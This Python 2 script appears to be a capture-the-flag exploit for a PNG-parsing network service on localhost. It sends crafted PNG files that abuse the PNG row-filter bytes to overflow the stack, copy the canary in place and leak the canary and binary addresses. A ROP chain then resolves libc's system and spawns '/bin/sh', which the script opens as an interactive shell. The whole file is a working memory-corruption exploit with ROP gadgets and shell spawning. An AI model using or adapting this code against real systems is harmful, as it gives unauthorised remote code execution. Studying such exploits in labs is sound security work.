#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib
import zlib


ADDR = "localhost"
PORT = 8888
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(x):
    return struct.pack("<Q", x)

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def build_png(buf, width=0x10, height=0x10, col_type=0x2):
    png = ""

    hdr = "\x89PNG\x0d\x0a\x1a\x0a"                 # PNG Header

    # IHDR chunk
    bit_depth = 0x8
    compr_type = 0x0 
    filt = 0x0
    ilace = 0x0
    data_len = 0xd

    ihdr = struct.pack(">I", data_len)              # length 
    ihdr += "IHDR"                                  # name
    ihdr += struct.pack(">I", width) + struct.pack(">I", height) + chr(bit_depth) + chr(col_type) + chr(compr_type) + chr(filt) + chr(ilace)
    ihdr += struct.pack(">I", zlib.crc32(ihdr[4:], 0) & 0xffffffff)


    # IDAT chunk
    cbuf = zlib.compress(buf, 9)
    idat = struct.pack(">I", len(cbuf))
    idat += "IDAT"
    idat += cbuf
    idat += struct.pack(">I", zlib.crc32(idat[4:], 0) & 0xffffffff)

    # IEND chunk
    iend = struct.pack(">I", 0x0)
    iend += "IEND"
    iend += struct.pack(">I", zlib.crc32(iend[4:], 0) & 0xffffffff)


    png += hdr
    png += ihdr
    png += idat
    png += iend

    return png

# zero filter
def zro(pixbuf):
    return "\x00" + pixbuf

# Filter type 'up'
# use value above current pixel
def up(pixbuf):
    return "\x02" + pixbuf 

# Filter type 'sub'
# use value left of current pixel
def sub(pixbuf):
    return "\x01" + pixbuf

# Filter type 'average'
# use mean of value from 'up' and 'sub' above current pixel
def avg(pixbuf):
    return "\x03" + pixbuf

# Filter type 'paeth'
# 'up', 'sub' or 'avg', whichever is closest to 
# p = 'up' + 'sub' - 'avg'
def paeth(pixbuf):
    return "\x04" + pixbuf


# there is a stack buffer overflow
# using the filtering properties of
# PNG files, we can overwrite the stack
# canary with itself
# since the binary is PIE we partially overwrite
# the return address to return to main() after we 
# have leaked addresses

rtil_str("!\n")

rowsize = 8
colsize = 1

# we copy the stack canary, saved rbp, and return address
# which are just 'one row' below us. (note that size of row is 8)
buf = ("\x02" + "\x00" * 24) * 6

# passed stack canary 
buf += "\x00" + "A" * 8                                             # overwrite rbp
buf += "\x79"                                                       # partial overwrite of rip to 'restart'


png = build_png(buf, width=rowsize, height=colsize)

s.send(str(len(png)) + "\n")
s.send(png)

lbuf = rtil_str("!\n")
lbuf = lbuf.split("\n")[3].strip()
lbuf = lbuf.split(" ")

canary = lbuf[0:8]
canary = ''.join(chr(int(i)) for i in canary)
canary = struct.unpack("<Q", canary)[0]

stkleak = lbuf[8:16]
stkleak = ''.join(chr(int(i)) for i in stkleak)
stkleak = struct.unpack("<Q", stkleak)[0]

txtleak = lbuf[16:]
txtleak = ''.join(chr(int(i)) for i in txtleak)
txtleak = struct.unpack("<Q", txtleak)[0]
txtbase = txtleak - 6222

print "[+] Canary: %s [+]"%(hex(canary))
print "[+] Stack leak: %s [+]"%(hex(stkleak))
print "[+] .text leak: %s [+]"%(hex(txtbase)) 

# rop gadgets
prdi = p64(txtbase + 0x1b53) 
prsir15 = p64(txtbase + 0x1b51)
magic_1 = p64(txtbase + 0x01B4A)
caller = p64(txtbase + 0x01B39)                                 # call [r12 + rbx *8]

puts_plt = p64(txtbase + 0xA20)
read_n = p64(txtbase + 0x1150)
bss = p64(txtbase + 0x203010)
sh_addr = p64(txtbase + 0x203018)                               # at bss + 8
printf_got = p64(txtbase + 0x0000000000202f68)

# same thing as first time except
# now we know the value of the canary
# we can easily overwrite it
buf = ("\x00" + struct.pack("<Q", canary) * 3) * 6

# passed stack canary 
# now we rop:
# leak the address of printf
# read address of system and 
# the string '/bin/sh\x00'into bss
# set r12 and rbx
# put address of '/bin/sh\x00' in rdi
# use caller gadget

buf += "\x00" 
buf += prdi
buf += printf_got                           
buf += puts_plt

buf += "\x00"
buf += prdi
buf += bss
buf += prsir15

buf += "\x00"
buf += p64(0x100)
buf += p64(0x42424242)                            
buf += read_n

buf += "\x00"
buf += magic_1
buf += p64(0x0)
buf += p64(0x4)

buf += "\x00"
buf += bss
buf += p64(0x42424242)
buf += p64(0x42424242)

buf += "\x00"
buf += p64(0x42424242)
buf += prdi
buf += sh_addr

buf += "\x00"
buf += caller

png = build_png(buf, width=rowsize, height=colsize)

s.send(str(len(png)) + "\n")
s.send(png)

rtil_str("\n")
rtil_str("\n")
rtil_str("\n")
rtil_str("\n")

leak = rtil_str("\n")[:-1]
printf = leak.ljust(8, "\x00")
printf = struct.unpack("<Q", printf)[0]

#off = -62592
off = -56768
system = p64(printf + off)
print "[+] printf: %s [+]"%(hex(printf))

buf = system
buf += "/bin/sh\x00"
s.send(buf + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
